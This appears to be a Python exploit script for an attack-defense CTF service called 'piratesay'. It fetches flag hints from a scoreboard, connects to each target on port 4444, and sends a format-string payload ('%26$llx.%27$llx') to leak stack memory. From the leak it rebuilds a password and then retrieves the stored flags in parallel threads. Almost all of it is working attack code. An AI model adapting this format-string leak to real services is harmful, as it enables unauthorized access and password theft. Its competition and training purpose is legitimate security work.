#!/usr/bin/env python3

import base64
import json
import random
import socket
import string
import sys
import threading
import time
import traceback
from typing import Optional

import requests

TARGET = "10.1.6.1" # Actual target, since for the perma setup it is only running on one host
ATTACK_INFO_TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
PORT = 4444

def recv_until_prompt(s, prompt):
    data = b''
    while not data.endswith(prompt):
        data += s.recv(1024)
    return data

def extract_password(message):
    address1_hex, address2_hex = message.split(' ')[0].split('.')
    address1 = bytes.fromhex(address1_hex).decode()[::-1]
    address2 = bytes.fromhex(address2_hex).decode()[::-1]
    return f'{address1}{address2}'

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')

    # TODO implement exploit
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((TARGET, PORT))

        # Initial prompt
        recv_until_prompt(s, b'$ ')

        # Navigate to the directory
        treasure_dir, treasure_file = hint.split('/')
        
        s.sendall(f'sail {treasure_dir}\n'.encode())
        recv_until_prompt(s, b'$ ')

        # Try to plunder the file
        s.sendall(f'loot {treasure_file}\n'.encode())
        recv_until_prompt(s, b': ')

        # Send the format string exploit as the password
        s.sendall(b'%26$llx.%27$llx\n')
        incorrect_message = recv_until_prompt(s, b'$ ').decode()

        # Extract the two addresses from the incorrect message
        password = extract_password(incorrect_message)

        # Try to plunder the file again with the password
        s.sendall(f'loot {treasure_file}\n'.encode())
        recv_until_prompt(s, b': ')
        s.sendall(f'{password}\n'.encode())

        # Check for the flag in the result
        result = recv_until_prompt(s, b'$ ')

        # Flag is found at Scammer ID: XXXXXXXX
        flag = result.decode().split('Scammer ID: ')[1].split('\n')[0]
        print(flag)

# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['piratesay']
team_info = service_info[ATTACK_INFO_TARGET] # Get the information for the current target
threads = []
for round_nr in team_info:
    round_info = team_info[round_nr]
    # Exploit 1 is in flag_store 0
    flag_store = '0'
    store_info = round_info[flag_store]
    for flag_info in store_info:
        # flag_info will always be a string, which you might have to parse with json.loads
        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
        t.start()
        threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)